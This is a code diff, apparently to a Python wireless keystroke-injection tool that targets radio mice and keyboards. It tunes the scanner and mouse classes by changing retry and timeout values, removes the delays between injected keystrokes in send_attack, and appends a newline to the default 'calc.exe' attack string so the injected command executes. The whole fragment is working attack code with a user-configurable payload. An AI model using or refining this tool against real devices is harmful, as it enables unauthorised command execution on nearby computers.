@@ -25,7 +25,7 @@ enable_debug = False
 
 class scanner:
 
-  def __init__(self, radio, ack_timeout=5, retries=2, debug=False):
+  def __init__(self, radio, ack_timeout=5, retries=1, debug=False):
     self.radio = radio
     self.channels = range(2, 84)
     self.channel_index = 0
@@ -184,7 +184,7 @@ class mouse:
     # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
   }
 
-  def __init__(self, radio, address, payload, ack_timeout=5, retries=2):
+  def __init__(self, radio, address, payload, ack_timeout=4, retries=15):
     self.radio = radio
     self.address = address
     self.string_address = ':'.join('{:02X}'.format(b) for b in address)
@@ -261,15 +261,12 @@ class mouse:
   def send_attack(self, attack):
     for _ in range(5):
       self.transmit()
-      time.sleep(0.015)
 
     self.send_run()
     for c in attack:
       self.transmit(c)
-      time.sleep(0.015)
     
     self.transmit()
-    time.sleep(0.015)
 
   def send_run(self):
     self.payload[6] = 67
@@ -309,7 +306,7 @@ def _debug(debug, text):
 
 @click.command()
 @click.option('--debug', is_flag=True, help='Enable debug.')
-@click.option('--attack', default="calc.exe", help="String to use for the attack")
+@click.option('--attack', default="calc.exe\n", help="String to use for the attack")
 @click.option('--attackfile', default="", type=click.Path())
 @click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
 @click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
